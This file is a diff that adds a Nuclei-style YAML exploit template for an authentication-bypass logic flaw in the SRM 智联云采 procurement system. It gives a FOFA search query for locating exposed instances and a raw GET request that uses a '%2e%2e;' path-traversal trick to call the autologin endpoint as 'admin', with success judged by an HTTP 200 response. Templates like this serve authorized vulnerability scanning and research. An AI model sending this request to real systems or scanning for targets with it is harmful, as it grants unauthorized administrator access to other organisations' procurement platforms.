@@ -1,0 +1,19 @@
+id: poc-cn5r3ku3b4509sv3
+info:
+  name: SRM智联云采系统 autologin 逻辑漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cn5r3ku3b4509sv3'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cn5r3ku3b4509sv3
+    fofa: title=="SRM 2.0" || body="assets/js/jweixin"
+http:
+- raw:
+  - GET /adpweb/static/%2e%2e;/api/sys/app/autologin?loginName=admin HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
